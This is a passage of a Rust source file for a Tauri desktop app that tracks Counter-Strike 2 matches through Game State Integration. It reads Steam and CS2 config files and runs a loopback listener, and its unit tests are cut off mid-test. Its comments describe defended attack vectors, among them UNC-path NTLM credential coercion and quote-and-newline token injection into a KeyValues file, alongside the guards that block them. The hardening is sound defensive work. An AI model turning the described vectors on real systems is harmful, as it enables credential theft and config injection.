use tauri::{
    menu::{Menu, MenuItem},
    tray::{MouseButton, MouseButtonState, TrayIconBuilder, TrayIconEvent},
    Emitter, Manager, WindowEvent,
};
use std::io::Read as _;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use tauri_plugin_autostart::{ManagerExt as _, MacosLauncher};
use tauri_plugin_notification::NotificationExt;
use tauri_plugin_opener::OpenerExt;
use tauri_plugin_updater::UpdaterExt;

// Fire a native OS notification. Wrapping the plugin in our own command means the
// frontend only calls a normal app command (no plugin-permission ACL needed).
// NOTE: on Windows a toast only shows for an INSTALLED build (registered AppUserModelID);
// a portable/dev exe returns Ok here but shows nothing.
#[tauri::command]
fn notify(app: tauri::AppHandle, title: String, body: String) -> Result<(), String> {
    app.notification()
        .builder()
        .title(title)
        .body(body)
        .show()
        .map_err(|e| e.to_string())
}

// Open an external URL in the user's real browser. In a Tauri webview a plain
// <a target="_blank"> opens a bare in-app window with no chrome instead of the
// system browser, so every external link (Steam Workshop, Leetify, feedback) is
// routed through here. Wrapping the opener plugin in our own command keeps the
// frontend on core:default — no plugin ACL (same pattern as notify/set_autostart).
// Restricted to http(s) so the webview can never be told to launch another scheme.
#[tauri::command]
fn open_url(app: tauri::AppHandle, url: String) -> Result<(), String> {
    let u = url.trim();
    if !(u.starts_with("https://") || u.starts_with("http://")) {
        return Err("refused: only http(s) URLs".into());
    }
    app.opener()
        .open_url(u, None::<&str>)
        .map_err(|e| e.to_string())
}

// ---- optional, desktop-only: which Workshop maps are already downloaded ----
// A passive hint for the "Get the maps" panel. Reads only — Steam's own registry key
// (HKCU, the user's hive) and workshop folders under the Steam library — so it needs no
// admin and never writes. FAIL-SAFE: if Steam can't be located, `ok` is false and the UI
// shows no badges rather than claiming every map is missing.
#[derive(serde::Serialize)]
struct WorkshopScan {
    ok: bool,
    installed: Vec<String>,
}

#[cfg(windows)]
fn steam_root() -> Option<PathBuf> {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let key = RegKey::predef(HKEY_CURRENT_USER)
        .open_subkey("Software\\Valve\\Steam")
        .ok()?;
    let p: String = key.get_value("SteamPath").ok()?;
    let root = PathBuf::from(p);
    // Reject a UNC registry value BEFORE the is_dir() below stats it (see is_local_path),
    // and sanity-check it's a real install so a stale path can't cry wolf.
    if is_local_path(&root) && root.join("steamapps").is_dir() {
        Some(root)
    } else {
        None
    }
}

#[cfg(not(windows))]
fn steam_root() -> Option<PathBuf> {
    None
}

// A path is rejected as non-local if it begins with two slashes — i.e. a UNC / network
// path like \\host\share. is_dir() on such a path makes Windows open an outbound SMB
// connection and attempt an NTLM handshake, so a crafted registry value or a tampered
// libraryfolders.vdf could coerce a credential leak just by our checking a folder exists.
// Steam library roots are always local drive paths, so this loses nothing legitimate.
fn is_local_path(p: &Path) -> bool {
    let s = p.as_os_str().to_string_lossy();
    let b = s.as_bytes();
    !(b.len() >= 2 && (b[0] == b'\\' || b[0] == b'/') && (b[1] == b'\\' || b[1] == b'/'))
}

// Every Steam library root: the main install plus any extra library folders declared in
// libraryfolders.vdf. Returns None if the vdf can't be read — a PARTIAL enumeration would
// let a map on an unread library get a false "not downloaded", so the caller fails closed
// (hides all badges) rather than asserting something wrong. UNC library entries are skipped.
fn steam_libraries(root: &Path) -> Option<Vec<PathBuf>> {
    let mut libs = vec![root.to_path_buf()];
    let vdf = root.join("steamapps").join("libraryfolders.vdf");
    let text = std::fs::read_to_string(&vdf).ok()?;
    for line in text.lines() {
        let l = line.trim();
        if !l.starts_with("\"path\"") {
            continue;
        }
        // line: "path"    "D:\\SteamLibrary"  -> take the second quoted string,
        // unescaping the VDF's doubled backslashes.
        let after = &l[6..];
        if let Some(open) = after.find('"') {
            let rest = &after[open + 1..];
            if let Some(close) = rest.find('"') {
                let p = PathBuf::from(rest[..close].replace("\\\\", "\\"));
                if is_local_path(&p) {
                    libs.push(p);
                }
            }
        }
        if libs.len() >= 32 {
            break; // bound a vdf padded with fabricated blocks
        }
    }
    Some(libs)
}

#[tauri::command]
fn scan_workshop(ids: Vec<String>) -> WorkshopScan {
    let root = match steam_root() {
        Some(r) => r,
        None => {
            return WorkshopScan {
                ok: false,
                installed: vec![],
            }
        }
    };
    // fail closed: if libraries can't be fully enumerated, hide badges instead of
    // reporting a map on an unread library as "not downloaded".
    let libs = match steam_libraries(&root) {
        Some(l) => l,
        None => {
            return WorkshopScan {
                ok: false,
                installed: vec![],
            }
        }
    };
    let mut installed = Vec::new();
    for id in ids {
        // ids come from our own catalog, but validate anyway so a folder name can never
        // escape the workshop path (no traversal even if the frontend is tampered with)
        if id.is_empty() || !id.chars().all(|c| c.is_ascii_digit()) {
            continue;
        }
        for lib in &libs {
            let p = lib
                .join("steamapps")
                .join("workshop")
                .join("content")
                .join("730")
                .join(&id);
            if p.is_dir() {
                installed.push(id.clone());
                break;
            }
        }
    }
    WorkshopScan { ok: true, installed }
}

// ---- automatic backup: mirror the app state to a file so a wiped WebView cache can't
// lose a streak. localStorage stays the live source of truth; this file just shadows it
// (written debounced on save) and is read back only when localStorage comes up empty. It
// lives in the roaming app-data dir, so clearing browser data never touches it.
fn backup_path(app: &tauri::AppHandle) -> Option<PathBuf> {
    app.path().app_data_dir().ok().map(|d| d.join("lockin-state.json"))
}

#[tauri::command]
fn backup_write(app: tauri::AppHandle, json: String) -> Result<(), String> {
    let path = backup_path(&app).ok_or("no app data dir")?;
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    }
    // write to a temp file then rename, so a crash mid-write can't corrupt the backup
    let tmp = path.with_extension("json.tmp");
    std::fs::write(&tmp, json.as_bytes()).map_err(|e| e.to_string())?;
    std::fs::rename(&tmp, &path).map_err(|e| e.to_string())
}

#[tauri::command]
fn backup_read(app: tauri::AppHandle) -> Option<String> {
    let path = backup_path(&app)?;
    std::fs::read_to_string(&path).ok()
}

// Delete the auto-backup file. Called by "Erase all data": without this the boot-restore path would
// read the still-present file on the next launch and silently resurrect the data the user just wiped.
// A missing file is success (nothing to erase).
#[tauri::command]
fn backup_delete(app: tauri::AppHandle) -> Result<(), String> {
    let path = match backup_path(&app) {
        Some(p) => p,
        None => return Ok(()),
    };
    match std::fs::remove_file(&path) {
        Ok(_) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(e.to_string()),
    }
}

// ---- read a couple of settings straight from CS2's own files, so the Gear tab can
// self-fill. Sensitivity is a plain "sensitivity" "x" line in the user convars; launch
// options live in Steam's localconfig.vdf under app 730. DPI is a hardware setting CS2
// never stores, and generating a shareable crosshair CODE would need Valve's encoding, so
// those two stay manual — but the crosshair CONVARS and the render resolution are both on
// disk and are read here. Reads only; fail-safe (every field is optional and absence is fine).
#[derive(serde::Serialize, Default)]
struct CsConfig {
    found: bool,
    sensitivity: Option<String>,
    launch: Option<String>,
    // Crosshair. Style is the coaching-relevant one: styles 2 and 3 are dynamic, and a
    // dynamic crosshair hides the spray pattern from the player learning it.
    crosshair_style: Option<String>,
    crosshair_size: Option<String>,
    crosshair_dot: Option<String>,
    crosshair_outline: Option<String>,
    // Resolution, from cs2_video.txt rather than the convars file.
    res_w: Option<String>,
    res_h: Option<String>,
    fullscreen: Option<String>,
    // NOTE: raw input is deliberately absent. `m_rawinput` no longer exists in CS2 — Valve
    // removed the cvar and raw input is always on. Reporting it would be inventing a setting.
}

// The next quoted string after `key` — for `"sensitivity"   "1.15"` returns "1.15".
fn quoted_after(text: &str, key: &str) -> Option<String> {
    let i = text.find(key)?;
    let after = &text[i + key.len()..];
    let a = after.find('"')?;
    let rest = &after[a + 1..];
    let b = rest.find('"')?;
    let v = rest[..b].trim().to_string();
    if v.is_empty() { None } else { Some(v) }
}

fn matching_brace(text: &str, open: usize) -> Option<usize> {
    let b = text.as_bytes();
    let mut depth = 0i32;
    for i in open..b.len() {
        match b[i] {
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(i);
                }
            }
            _ => {}
        }
    }
    None
}

// LaunchOptions of app 730 in localconfig.vdf: find a `"730"` KEY (one immediately
// followed by a `{` block, not a value), brace-match its block, read LaunchOptions inside.
fn launch_opts_730(text: &str) -> Option<String> {
    let mut from = 0;
    while let Some(rel) = text[from..].find("\"730\"") {
        let pos = from + rel;
        let after = &text[pos + 5..];
        if let Some(brace) = after.find('{') {
            if after[..brace].trim().is_empty() {
                let start = pos + 5 + brace;
                if let Some(end) = matching_brace(text, start) {
                    if let Some(v) = quoted_after(&text[start..=end], "\"LaunchOptions\"") {
                        return Some(v);
                    }
                }
            }
        }
        from = pos + 5;
    }
    None
}

#[tauri::command]
fn read_cs_config() -> CsConfig {
    let mut out = CsConfig::default();
    let root = match steam_root() {
        Some(r) => r,
        None => return out,
    };
    let userdata = root.join("userdata");
    let entries = match std::fs::read_dir(&userdata) {
        Ok(e) => e,
        Err(_) => return out,
    };
    // a machine can have several Steam accounts — take the one whose CS2 convars file was
    // written most recently (the account actually being played).
    let mut best: Option<(std::time::SystemTime, PathBuf, PathBuf)> = None;
    for e in entries.flatten() {
        let acc = e.path();
        if !acc.is_dir() {
            continue;
        }
        for sub in ["local", "remote"] {
            let vcfg = acc
                .join("730")
                .join(sub)
                .join("cfg")
                .join("cs2_user_convars_0_slot0.vcfg");
            if let Ok(meta) = std::fs::metadata(&vcfg) {
                let mt = meta.modified().unwrap_or(std::time::UNIX_EPOCH);
                if best.as_ref().map_or(true, |b| mt > b.0) {
                    best = Some((mt, vcfg.clone(), acc.clone()));
                }
            }
        }
    }
    if let Some((_, vcfg, acc)) = best {
        out.found = true;
        if let Ok(text) = std::fs::read_to_string(&vcfg) {
            out.sensitivity = quoted_after(&text, "\"sensitivity\"");
            out.crosshair_style = quoted_after(&text, "\"cl_crosshairstyle\"");
            out.crosshair_size = quoted_after(&text, "\"cl_crosshairsize\"");
            out.crosshair_dot = quoted_after(&text, "\"cl_crosshairdot\"");
            out.crosshair_outline = quoted_after(&text, "\"cl_crosshair_drawoutline\"");
        }
        // Resolution lives in cs2_video.txt, a sibling of the convars file, NOT in the convars.
        if let Some(dir) = vcfg.parent() {
            if let Ok(text) = std::fs::read_to_string(dir.join("cs2_video.txt")) {
                out.res_w = quoted_after(&text, "\"setting.defaultres\"");
                out.res_h = quoted_after(&text, "\"setting.defaultresheight\"");
                out.fullscreen = quoted_after(&text, "\"setting.fullscreen\"");
            }
        }
        if let Ok(text) = std::fs::read_to_string(acc.join("config").join("localconfig.vdf")) {
            out.launch = launch_opts_730(&text);
        }
    }
    out
}

// ---- CS2 auto-tracking via Game State Integration (desktop only) ----
// CS2 will POST live match JSON to a local URL if a gamestate_integration_*.cfg names one.
// We (1) run a tiny loopback-only HTTP listener that receives those POSTs, and (2) write the
// cfg into the CS2 folder on request. The listener forwards two things to the webview: a
// `gsi-beat` on every payload (so the UI can show "connected"), and a `gsi-match` when a match
// ends (map.phase -> "gameover") carrying win/loss so the frontend can log it and drive the
// stop-loss. Bound to 127.0.0.1 and gated by a shared token that only lives in the cfg + here,
// so nothing off-machine — and no other local app lacking the token — can inject fake results.
static GSI_STARTED: AtomicBool = AtomicBool::new(false);
// A CS2 GSI payload is a few KB; cap the read so a hostile local process can't stream an unbounded
// body and OOM the whole app before we even authenticate the request.
const GSI_MAX_BODY: u64 = 256 * 1024;

/* The token is embedded VERBATIM between two quotes in a KeyValues file, so its shape is a
   security property, not a formatting detail. The comment above gsi_config_body used to assert
   "token is app-minted hex" — true of a fresh install, false on any machine that has restored
   a backup: validBackup never inspected settings, so settings.gsiToken was fully attacker-
   controlled. A token carrying a quote and a newline closes our block and opens a second one,
   giving CS2 a second GSI endpoint pointed anywhere. Validate here, where it is trusted, not
   only in the frontend that can be replaced.
   NOT a #[tauri::command] — it is an internal helper, and it must sit ABOVE the attribute so
   the attribute stays attached to start_gsi. */
fn gsi_token_ok(t: &str) -> bool {
    t.len() == 32 && t.chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
}

#[tauri::command]
fn start_gsi(app: tauri::AppHandle, port: u16, token: String) -> Result<(), String> {
    if !gsi_token_ok(&token) {
        return Err("refused: malformed GSI token".into());
    }
    // idempotent: the frontend calls this on every boot, but one listener per process is enough.
    if GSI_STARTED.swap(true, Ordering::SeqCst) {
        return Ok(());
    }
    std::thread::spawn(move || gsi_loop(app, port, token));
    Ok(())
}

/* ---------- per-round capture ----------
   CS2 has been streaming us health, money, equipment and round phase twice a second all along
   and we used exactly one field of it. This turns that stream into a record per round so the
   death audit stops being something the player types in after the fact.

   Everything here is derived from OUR OWN player block, which is all GSI gives you in your own
   match — no teammate data, nothing about opponents, no memory reading. The round clock is
   local: CS2 does not hand you "seconds into the round", so we start a timer when the phase
   goes live and read it when health hits zero. That is accurate to the 0.5s throttle in the
   cfg, which is fine for "died in the first twenty seconds" and NOT fine for anything finer.
   We record the number, never a claim about it. */
#[derive(Default)]
struct RoundTracker {
    map_phase: String,
    round_phase: String,
    round_no: i64,
    live_at: Option<std::time::Instant>,
    buy_money: i64,
    buy_equip: i64,
    death_ms: Option<u64>,
    death_money: i64,
    // kills as last reported by a payload that was ME. round_kills cannot rise after you
    // die, so on a death round this equals kills-at-death; on a round you survived it is the
    // real count, which death_kills could never be because it was only written in the death
    // branch. Result: every surviving round recorded 0 kills while CS2 was sending the number
    // in every single payload.
    last_kills: i64,
    team: String,
    emitted: bool,
}

// Am I the player this payload describes? While dead you spectate a team-mate and CS2 keeps
// sending player blocks — for THEM. Without this the record would quietly become a mix of two
// people's rounds, which is worse than having no record at all.
fn gsi_is_self(v: &serde_json::Value) -> bool {
    let me = v.pointer("/provider/steamid").and_then(|s| s.as_str());
    let who = v.pointer("/player/steamid").and_then(|s| s.as_str());
    match (me, who) {
        (Some(a), Some(b)) => a == b,
        // no provider block (older payload shapes) — fall back to trusting the player block
        (None, Some(_)) => true,
        _ => false,
    }
}

// Pure win/loss derivation, split out so it can be unit-tested (the emit path can't be). player.team
// absent (spectating/HLTV) => "unknown": the frontend logs the match but never counts it as a loss.
fn gsi_result(ct: i64, t: i64, team: &str) -> &'static str {
    if team != "CT" && team != "T" {
        "unknown"
    } else if ct == t {
        "tie"
    } else if (ct > t) == (team == "CT") {
        "win"
    } else {
        "loss"
    }
}

fn gsi_loop(app: tauri::AppHandle, port: u16, token: String) {
    // loopback only: never 0.0.0.0, so the listener is unreachable from the network.
    let server = match tiny_http::Server::http(("127.0.0.1", port)) {
        Ok(s) => std::sync::Arc::new(s),
        Err(_) => {
            GSI_STARTED.store(false, Ordering::SeqCst); // let a later retry rebind
            return;
        }
    };
    // Shared across workers so both the live->gameover edge and the per-round record fire exactly
    // once, whichever worker happens to pick up the POST that carries the transition.
    let prev_phase = std::sync::Arc::new(std::sync::Mutex::new(RoundTracker::default()));
    // A small worker pool sharing the listener: a stalled or hostile local client (a body that never
    // finishes) ties up at most one worker, so genuine CS2 POSTs are still served by the others — the
    // previous single loop could be frozen entirely by one hung connection (slow-loris starvation).
    let mut workers = Vec::new();
    for _ in 0..4 {
        let server = server.clone();
        let app = app.clone();
        let token = token.clone();
        let prev = prev_phase.clone();
        workers.push(std::thread::spawn(move || {
            for req in server.incoming_requests() {
                handle_gsi_request(req, &app, &token, &prev);
            }
        }));
    }
    for w in workers {
        let _ = w.join();
    }
    GSI_STARTED.store(false, Ordering::SeqCst);
}

/* The state machine, split out from the request so it is unit-testable: feed it payloads, get
   back at most one record per round. Returns Some only on the freeze/live -> over edge.
   Deliberately records WHAT HAPPENED and nothing else — no verdicts, no "you died too early".
   Whether 14 seconds is early is a coaching claim, and it does not get to be made until there
   is real data from real matches to make it against. */
fn track_round(tr: &mut RoundTracker, v: &serde_json::Value, is_self: bool) -> Option<serde_json::Value> {
    // Round phase and round number are MATCH-GLOBAL: true whoever the player block describes.
    // Only the player-derived reads below are person-specific. Gating the whole machine on
    // is_self was the original bug — the moment you die you spectate a team-mate, the machine
    // stopped seeing phase changes, and the "over" edge that emits the record never arrived.
    // So every round you died in was silently dropped and the card reported zero deaths.
    let rphase = v.pointer("/round/phase").and_then(|p| p.as_str()).unwrap_or("").to_string();
    let round_no = v.pointer("/map/round").and_then(|r| r.as_i64()).unwrap_or(-1);
    // -1 means "no reading", which is not the same as 0 health.
    let health = if is_self { v.pointer("/player/state/health").and_then(|h| h.as_i64()).unwrap_or(-1) } else { -1 };
    let money = if is_self { v.pointer("/player/state/money").and_then(|m| m.as_i64()).unwrap_or(0) } else { 0 };
    let equip = if is_self { v.pointer("/player/state/equip_value").and_then(|m| m.as_i64()).unwrap_or(0) } else { 0 };
    let kills = if is_self { v.pointer("/player/state/round_kills").and_then(|m| m.as_i64()).unwrap_or(0) } else { 0 };
    // Remember my own team from the last payload that was actually me — by the time the round
    // ends I may be spectating, and the spectated block's team is not guaranteed to be mine.
    if is_self {
        if let Some(t) = v.pointer("/player/team").and_then(|s| s.as_str()) {
            if !t.is_empty() { tr.team = t.to_string(); }
        }
        // captured on EVERY payload that is me, not only on the one where I died
        tr.last_kills = kills;
    }

    /* ORDER IS THE WHOLE FIX, and it was wrong from the day this shipped.
       Captured from a live match: CS2 increments map.round in the SAME payload that flips
       round.phase to "over" — map.round is rounds COMPLETED, so it is 0 through round one and
       becomes 1 the instant round one ends:
           map.round=0  round.phase=live      <- live_at set here
           map.round=1  round.phase=over      <- round number ALREADY changed
       The reset below used to run first. It cleared live_at, and the emit test immediately
       under it requires live_at.is_some(), so the record was never produced. Not for a
       stale edge case — for EVERY round, for every user, in 0.46 and 0.47.
       It passed CI because every fixture held map.round constant across the over edge: the
       tests encoded the same assumption as the code, so they agreed with each other and
       neither agreed with CS2.
       So: read the death, emit the record, and only THEN reset. */
    let prev_phase = tr.round_phase.clone();

    // First transition to zero health is the death; later payloads must not overwrite it (you
    // stay at 0 until the next freezetime and we would keep pushing the time later).
    // NOT gated on phase=="live": when your death IS the round-ending event, CS2 coalesces
    // health->0 and phase->over into ONE payload (our own cfg sets buffer 0.1 / throttle 0.5),
    // so a "live" gate drops exactly the last-alive deaths — the most informative ones.
    // live_at.is_some() is the real precondition: it means this round genuinely started.
    if health == 0 && tr.live_at.is_some() && tr.death_ms.is_none() {
        if let Some(started) = tr.live_at {
            tr.death_ms = Some(started.elapsed().as_millis() as u64);
            tr.death_money = money;
        }
    }

    // Emit once, on the edge into "over", and only for a round we actually saw go live —
    // BEFORE the reset, which is about to clear the very state this depends on.
    let mut out = None;
    if rphase == "over" && prev_phase != "over" && !tr.emitted && tr.live_at.is_some() {
        tr.emitted = true;
        // my team as last seen on a payload that was actually me, not the spectated one
        let team = tr.team.clone();
        let winner = v.pointer("/round/win_team").and_then(|s| s.as_str()).unwrap_or("");
        let won = if team.is_empty() || winner.is_empty() { serde_json::Value::Null }
                  else { serde_json::Value::Bool(team == winner) };
        out = Some(serde_json::json!({
            // the number of the round that just ENDED. map.round has already been bumped to
            // it on this payload, which is exactly the 1-based number on the scoreboard.
            "round": round_no,
            "map": v.pointer("/map/name").and_then(|s| s.as_str()).unwrap_or(""),
            // The GAME MODE, because economy only exists in some of them. Casual hands out
            // free armour, runs different loss bonuses and lets you sit on the $16k cap
            // buying nothing — a real capture showed exactly that, and any economy reading
            // built on it would be measuring a mode where the decision does not exist.
            "mode": v.pointer("/map/mode").and_then(|s| s.as_str()).unwrap_or(""),
            "died": tr.death_ms.is_some(),
            "deathMs": tr.death_ms,
            "buyMoney": tr.buy_money,
            "buyEquip": tr.buy_equip,
            "leftOver": tr.death_money,
            "roundKills": tr.last_kills,
            "won": won,
        }));
    }

    // A new round number always resets, even if we somehow missed the phase edges. This now
    // runs AFTER the emit above, which is the entire point — CS2 bumps map.round on the same
    // payload that ends the round, so resetting first threw away the record.
    if round_no != tr.round_no {
        tr.round_no = round_no;
        tr.live_at = None;
        tr.death_ms = None;
        tr.emitted = false;
        tr.buy_money = 0;
        tr.buy_equip = 0;
        tr.death_money = 0;
        tr.last_kills = 0;
        tr.team.clear();
    }

    tr.round_phase = rphase.clone();

    // The moment the round goes live is the only honest zero for a round clock, and it is also
    // when the buy is final — so both are captured on the same edge. After the reset, so a
    // round number that changes on this same payload cannot wipe the clock we just started.
    if rphase == "live" && prev_phase != "live" {
        tr.live_at = Some(std::time::Instant::now());
        tr.buy_money = money;
        tr.buy_equip = equip;
        tr.death_ms = None;
    }

    out
}

fn handle_gsi_request(
    mut req: tiny_http::Request,
    app: &tauri::AppHandle,
    token: &str,
    prev_phase: &std::sync::Mutex<RoundTracker>,
) {
    let mut body = String::new();
    // capped read: bound memory even for an untrusted, oversized, or never-terminating body.
    let _ = req.as_reader().take(GSI_MAX_BODY).read_to_string(&mut body);
    // always 200 so CS2 doesn't back off; the body is ignored by the game.
    let _ = req.respond(tiny_http::Response::from_string(""));
    let v: serde_json::Value = match serde_json::from_str(&body) {
        Ok(v) => v,
        Err(_) => return,
    };
    // reject anything without our token before it can move any UI state.
    let tok = v.pointer("/auth/token").and_then(|t| t.as_str()).unwrap_or("");
    if tok != token {
        return;
    }
    let _ = app.emit("gsi-beat", ());
    let phase = v
        .pointer("/map/phase")
        .and_then(|p| p.as_str())
        .unwrap_or("")
        .to_string();
    // Everything that mutates shared state happens under one lock, so two workers racing on
    // adjacent POSTs cannot both claim the same edge or emit the same round twice.
    let (edge, round_record) = {
        let mut tr = prev_phase.lock().unwrap_or_else(|p| p.into_inner());
        let was = std::mem::replace(&mut tr.map_phase, phase.clone());
        let edge = phase == "gameover" && was != "gameover";
        // EVERY payload drives the phase machine; only the player reads are gated on is_self
        let rec = track_round(&mut tr, &v, gsi_is_self(&v));
        (edge, rec)
    };
    if let Some(rec) = round_record {
        let _ = app.emit("gsi-round", rec);
    }
    if edge {
        let ct = v.pointer("/map/team_ct/score").and_then(|s| s.as_i64()).unwrap_or(0);
        let t = v.pointer("/map/team_t/score").and_then(|s| s.as_i64()).unwrap_or(0);
        let team = v.pointer("/player/team").and_then(|s| s.as_str()).unwrap_or("");
        let map = v.pointer("/map/name").and_then(|s| s.as_str()).unwrap_or("");
        let result = gsi_result(ct, t, team);
        let _ = app.emit(
            "gsi-match",
            serde_json::json!({ "result": result, "ct": ct, "t": t, "map": map }),
        );
    }
}

// The GSI cfg body, split out so its shape is unit-testable. token/port are echoed verbatim; token is
// app-minted hex and port is a u16, so neither can break out of the KeyValues quoting.
fn gsi_config_body(token: &str, port: u16) -> String {
    format!(
        "\"Lockin auto-tracking\"\n{{\n  \"uri\" \"http://127.0.0.1:{port}/\"\n  \"timeout\" \"5.0\"\n  \"buffer\" \"0.1\"\n  \"throttle\" \"0.5\"\n  \"heartbeat\" \"30.0\"\n  \"auth\"\n  {{\n    \"token\" \"{token}\"\n  }}\n  \"data\"\n  {{\n    \"provider\" \"1\"\n    \"map\" \"1\"\n    \"round\" \"1\"\n    \"player_id\" \"1\"\n    \"player_state\" \"1\"\n    \"player_match_stats\" \"1\"\n  }}\n}}\n"
    )
}

// Write CS2's gamestate_integration_lockin.cfg so the game starts POSTing to our listener.
// This is the only place the app writes into the CS2 folder, and only on an explicit button.
#[tauri::command]
fn write_gsi_config(token: String, port: u16) -> Result<String, String> {
    // same gate as start_gsi, so the cfg and the listener can never disagree about the token
    if !gsi_token_ok(&token) {
        return Err("refused: malformed GSI token".into());
    }
    let root = steam_root().ok_or("Couldn't find Steam")?;
    let libs = steam_libraries(&root).ok_or("Couldn't read Steam libraries")?;
    for lib in libs {
        let csgo = lib
            .join("steamapps")
            .join("common")
            .join("Counter-Strike Global Offensive")
            .join("game")
            .join("csgo");
        if !csgo.is_dir() {
            continue;
        }
        let cfg = csgo.join("cfg");
        std::fs::create_dir_all(&cfg).map_err(|e| e.to_string())?;
        let path = cfg.join("gamestate_integration_lockin.cfg");
        std::fs::write(&path, gsi_config_body(&token, port)).map_err(|e| e.to_string())?;
        return Ok(path.to_string_lossy().to_string());
    }
    Err("Couldn't find your CS2 install".into())
}

#[cfg(test)]
mod tests {
    use super::{gsi_config_body, gsi_is_self, gsi_result, gsi_token_ok, quoted_after, track_round, RoundTracker};

    // Payloads shaped like the ones CS2 actually posts, so the pointers are exercised for real.
    fn payload(rphase: &str, round: i64, health: i64, money: i64, equip: i64, kills: i64) -> serde_json::Value {
        serde_json::json!({
            "provider": { "steamid": "76561198000000001" },
            "player": {
                "steamid": "76561198000000001",
                "team": "CT",
                "state": { "health": health, "money": money, "equip_value": equip, "round_kills": kills }
            },
            "map": { "name": "de_mirage", "round": round, "phase": "live" },
            "round": { "phase": rphase, "win_team": "T" }
        })
    }

    /* CAPTURED FROM A REAL MATCH, not imagined. Every other fixture in this file was written
       from my belief about what CS2 sends, and that belief was wrong in one specific way:
       map.round is rounds COMPLETED, so it increments in the SAME payload that flips
       round.phase to "over". The tracker reset on a round-number change and then required
       live_at to still be set, so it recorded NOTHING — in 0.46 and 0.47, for everyone.
       The suite passed throughout because the fixtures held map.round constant across the
       over edge: the tests agreed with the code and neither agreed with the game.

       This is the transition sequence a live listener logged, verbatim (payload numbers are
       from that capture). It happens to be the best round in the whole session: a death, a
       spectated team-mate who ALSO drops to zero afterwards, and the round-number bump — all
       in one round. */
    #[test]
    fn the_sequence_a_real_match_actually_sends() {
        let mut tr = RoundTracker::default();
        let me = |rphase: &str, round: i64, health: i64| {
            let mut p = payload(rphase, round, health, 800, 3600, 1);
            p["player"]["team"] = serde_json::json!("T");   // capture had T winning as T
            p
        };
        // #33 freezetime, map.round=3
        assert!(track_round(&mut tr, &me("freezetime", 3, 100), true).is_none());
        // #34 the round goes live, still map.round=3
        assert!(track_round(&mut tr, &me("live", 3, 100), true).is_none());
        // #36 taking damage
        assert!(track_round(&mut tr, &me("live", 3, 51), true).is_none());
        std::thread::sleep(std::time::Duration::from_millis(20));
        // #39 dead
        assert!(track_round(&mut tr, &me("live", 3, 0), true).is_none());
        // #45 now spectating a team-mate who ALSO hits zero — must not count as a second death
        let mut spec = me("live", 3, 0);
        spec["player"]["steamid"] = serde_json::json!("76561198000000999");
        assert!(track_round(&mut tr, &spec, false).is_none());
        // #51 the round ends — and map.round has ALREADY become 4 on this very payload
        let rec = track_round(&mut tr, &me("over", 4, 85), true)
            .expect("the over edge must produce a record even though map.round changed on it");
        assert_eq!(rec["round"], 4, "the round that just ended is the bumped number");
        assert_eq!(rec["died"], true, "the death at #39 must survive the spectate and the bump");
        assert_eq!(rec["won"], true, "my team was T and T won");
        let ms = rec["deathMs"].as_u64().expect("a death must carry its timestamp");
        assert!(ms >= 20, "death was timed from the live edge, got {ms}ms");
        // #52 the next freezetime must not emit anything more
        assert!(track_round(&mut tr, &me("freezetime", 4, 100), true).is_none());
    }

    /* Straight from the same capture: round one, survived, two kills. round_kills was in
       EVERY payload and the record threw it away, because it was only ever written inside
       the death branch — so a round you lived through always claimed zero. */
    #[test]
    fn a_round_you_survived_still_records_its_kills() {
        let mut tr = RoundTracker::default();
        assert!(track_round(&mut tr, &payload("freezetime", 0, 100, 800, 200, 0), true).is_none());
        assert!(track_round(&mut tr, &payload("live", 0, 100, 800, 3600, 0), true).is_none());
        assert!(track_round(&mut tr, &payload("live", 0, 100, 800, 3600, 1), true).is_none());
        assert!(track_round(&mut tr, &payload("live", 0, 100, 800, 3600, 2), true).is_none());
        // over, map.round bumped to 1, still alive on 100hp
        let rec = track_round(&mut tr, &payload("over", 1, 100, 800, 3600, 2), true).unwrap();
        assert_eq!(rec["died"], false);
        assert_eq!(rec["roundKills"], 2, "two kills happened and they must survive the round");
    }

    #[test]
    fn kills_are_not_taken_from_the_player_you_are_spectating() {
        let mut tr = RoundTracker::default();
        track_round(&mut tr, &payload("live", 0, 100, 800, 3600, 1), true);
        track_round(&mut tr, &payload("live", 0, 0, 800, 3600, 1), true); // I die holding 1 kill
        let mut spec = payload("live", 0, 100, 800, 3600, 4); // a team-mate on 4
        spec["player"]["steamid"] = serde_json::json!("76561198000000999");
        track_round(&mut tr, &spec, false);
        let rec = track_round(&mut tr, &payload("over", 1, 0, 800, 3600, 1), true).unwrap();
        assert_eq!(rec["roundKills"], 1, "my kills, never the spectated player's");
        assert_eq!(rec["died"], true);
    }

    #[test]
    fn a_round_produces_exactly_one_record_on_the_over_edge() {
        let mut tr = RoundTracker::default();
        assert!(track_round(&mut tr, &payload("freezetime", 3, 100, 4200, 200, 0), true).is_none());
        assert!(track_round(&mut tr, &payload("live", 3, 100, 800, 3600, 0), true).is_none());
        assert!(track_round(&mut tr, &payload("live", 3, 42, 800, 3600, 0), true).is_none());
        let rec = track_round(&mut tr, &payload("over", 4, 0, 800, 3600, 1), true);
        assert!(rec.is_some(), "the over edge must produce a record");
        // "over" persists for several posts — it must not emit again
        assert!(track_round(&mut tr, &payload("over", 4, 0, 800, 3600, 1), true).is_none());
    }

    #[test]
    fn death_is_the_FIRST_zero_health_not_the_last() {
        // you stay at 0 until the next freezetime, so later payloads would keep pushing the
        // recorded time later and every death would look like it happened at round end.
        let mut tr = RoundTracker::default();
        track_round(&mut tr, &payload("live", 5, 100, 800, 3600, 0), true);
        track_round(&mut tr, &payload("live", 5, 0, 650, 3600, 1), true);
        std::thread::sleep(std::time::Duration::from_millis(30));
        track_round(&mut tr, &payload("live", 5, 0, 650, 3600, 1), true);
        let rec = track_round(&mut tr, &payload("over", 6, 0, 650, 3600, 1), true).unwrap();
        assert_eq!(rec["died"], serde_json::json!(true));
        assert_eq!(rec["roundKills"], serde_json::json!(1));
        assert!(rec["deathMs"].as_u64().unwrap() < 30, "must be the first zero, not the last");
    }

    #[test]
    fn surviving_the_round_records_no_death() {
        let mut tr = RoundTracker::default();
        track_round(&mut tr, &payload("live", 7, 100, 800, 3600, 0), true);
